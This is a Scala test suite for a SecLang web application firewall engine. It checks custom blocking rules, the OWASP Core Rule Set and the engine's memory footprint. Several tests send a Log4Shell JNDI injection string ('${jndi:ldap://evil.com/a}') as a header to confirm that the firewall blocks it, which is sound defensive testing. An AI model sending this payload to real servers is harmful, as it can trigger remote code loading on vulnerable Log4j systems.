package com.cloud.apim.seclang.test

import com.cloud.apim.seclang.impl.engine.SecLangEngine
import com.cloud.apim.seclang.model.Disposition._
import com.cloud.apim.seclang.model._
import com.cloud.apim.seclang.scaladsl.{SecLang, SecLangPresets}
import squants.information.Bytes

import java.io.File
import java.nio.file.Files

class SecLangFactoryTest extends munit.FunSuite {

  test("simple factory test") {
    val presets = Map(
      "no_firefox" -> SecLangPreset.withNoFiles("no_firefox",
        """
          |SecRule REQUEST_HEADERS:User-Agent "@pm firefox" \
          |   "id:00001,\
          |   phase:1,\
          |   block,\
          |   t:none,t:lowercase,\
          |   msg:'someone used firefox to access',\
          |   logdata:'someone used firefox to access',\
          |   tag:'test',\
          |   ver:'0.0.0-dev',\
          |   status:403,\
          |   severity:'CRITICAL'"
          |""".stripMargin),
      "health_check" -> SecLangPreset.withNoFiles("health_check",
        """
          |SecRule REQUEST_URI "@contains /health" \
          |   "id:00002,\
          |   phase:1,\
          |   pass,\
          |   t:none,t:lowercase,\
          |   msg:'someone called /health',\
          |   logdata:'someone called /health',\
          |   tag:'test',\
          |   ver:'0.0.0-dev'"
          |""".stripMargin)
    )
    val factory = SecLang.factory(presets)
    val rulesConfig = List(
      "@import_preset no_firefox",
      "@import_preset health_check",
      "SecRuleEngine On"
    )
    val failing_ctx_2 = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map("User-Agent" -> List("Firefox/128.0"))),
      query = Map("q" -> List("test")),
      body = None
    )
    val passing_ctx_1 = RequestContext(
      method = "GET",
      uri = "/health",
      headers = Headers(Map("User-Agent" -> List("curl/8.0"))),
      query = Map("q" -> List("test")),
      body = None
    )
    val passing_ctx_2 = RequestContext(
      method = "GET",
      uri = "/admin",
      headers = Headers(Map("User-Agent" -> List("chrome/8.0"))),
      query = Map("q" -> List("test")),
      body = None
    )

    val failing_res_2 = factory.evaluate(rulesConfig, failing_ctx_2, phases = List(1, 2))
    val passing_res_1 = factory.evaluate(rulesConfig, passing_ctx_1, phases = List(1, 2))
    val passing_res_2 = factory.evaluate(rulesConfig, passing_ctx_2, phases = List(1, 2))

    assertEquals(failing_res_2.disposition, Block(403, Some("someone used firefox to access"), Some(1)))
    assertEquals(passing_res_1.disposition, Continue)
    assertEquals(passing_res_2.disposition, Continue)
  }

  test("remote http crs test") {
    val factory = SecLang.factory(Map("crs" -> SecLangPresets.coreruleset))
    val rulesConfig = List(
      "@import_preset crs",
      "SecRuleEngine On"
    )
    val passing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.owasp.org"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      ))
    )
    factory.evaluate(rulesConfig, passing_ctx, phases = List(1, 2)).displayPrintln()
    val failing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.foo.bar"),
        "Apikey" -> List("${jndi:ldap://evil.com/a}"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      )),
      query = Map("q" -> List("test")),
      body = None
    )
    val failing_res = factory.evaluate(rulesConfig, failing_ctx, phases = List(1, 2)).displayPrintln()
    assertEquals(failing_res.disposition, Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
  }

  test("local fs crs test") {
    val crs = SecLangPreset.fromSource(
      name = "crs",
      rulesSource = ConfigurationSourceList(
        List(
          RawConfigurationSource(
            """SecAction \
              |    "id:900990,\
              |    phase:1,\
              |    pass,\
              |    t:none,\
              |    nolog,\
              |    tag:'OWASP_CRS',\
              |    ver:'OWASP_CRS/4.22.0',\
              |    setvar:tx.crs_setup_version=4220"
              |""".stripMargin),
          FileScanConfigurationSource("./test-data/coreruleset/rules", """.*\.conf""")
        )
      ),
      filesSource = FilesSourceList(
        List(
          FsScanFilesSource("./test-data/coreruleset/rules", """.*\.data""")
        )
      ),
    )
    val factory = SecLang.factory(Map("crs" -> crs))
    val rulesConfig = List(
      "@import_preset crs",
      "SecRuleEngine On"
    )
    val passing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.owasp.org"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      ))
    )
    factory.evaluate(rulesConfig, passing_ctx, phases = List(1, 2)).displayPrintln()
    val failing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.foo.bar"),
        "Apikey" -> List("${jndi:ldap://evil.com/a}"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      )),
      query = Map("q" -> List("test")),
      body = None
    )
    val failing_res = factory.evaluate(rulesConfig, failing_ctx, phases = List(1, 2)).displayPrintln()
    assertEquals(failing_res.disposition, Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
  }
}
class SecLangFactorySizeTest extends munit.FunSuite {
  test("factory size") {
    val crs = SecLangPreset.fromSource(
      name = "crs",
      rulesSource = ConfigurationSourceList(
        List(
          RawConfigurationSource(
            """SecAction \
              |    "id:900990,\
              |    phase:1,\
              |    pass,\
              |    t:none,\
              |    nolog,\
              |    tag:'OWASP_CRS',\
              |    ver:'OWASP_CRS/4.22.0',\
              |    setvar:tx.crs_setup_version=4220"
              |""".stripMargin),
          FileScanConfigurationSource("./test-data/coreruleset/rules", """.*\.conf""")
        )
      ),
      filesSource = FilesSourceList(
        List(
          FsScanFilesSource("./test-data/coreruleset/rules", """.*\.data""")
        )
      ),
    )
    val factory = SecLang.factory(Map("crs" -> crs), integration = DefaultNoCacheSecLangIntegration.default)
    // val factory = SecLang.factory(Map("crs" -> crs), integration = DefaultSecLangIntegration.default)
    val rulesConfig = List(
      "@import_preset crs",
      "SecRuleEngine On"
    )

    println(s"factory preset: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(crs).totalSize()).toMegabytes} Mb")
    println(s"factory 1: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(factory).totalSize()).toMegabytes} Mb")
    val failing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.foo.bar"),
        "Apikey" -> List("${jndi:ldap://evil.com/a}"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      )),
      query = Map("q" -> List("test")),
      body = None
    )
    var engines = List.empty[SecLangEngine]
    for (i <- 1 to 1000) {
      val e = factory.engine(rulesConfig)
      engines = engines :+ e
    }
    println(s"factory 2: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(factory).totalSize()).toMegabytes} Mb")
    println(s"enginesSize size: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(engines).totalSize()).toMegabytes} Mb")
    engines.foreach { e =>
      val r = e.evaluate(failing_ctx, List(1, 2))
      assertEquals(r.disposition, Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
    }
    println(s"factory 2: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(factory).totalSize()).toMegabytes} Mb")
    println(s"enginesSize size: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(engines).totalSize()).toMegabytes} Mb")
    val e = SecLang.engine(SecLang.compile(SecLang.parse("SecRuleEngine On").right.get), integration = DefaultNoCacheSecLangIntegration.default)
    println(s"simple engine size: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(e).totalSize()).toKilobytes} Kb")
  }
}
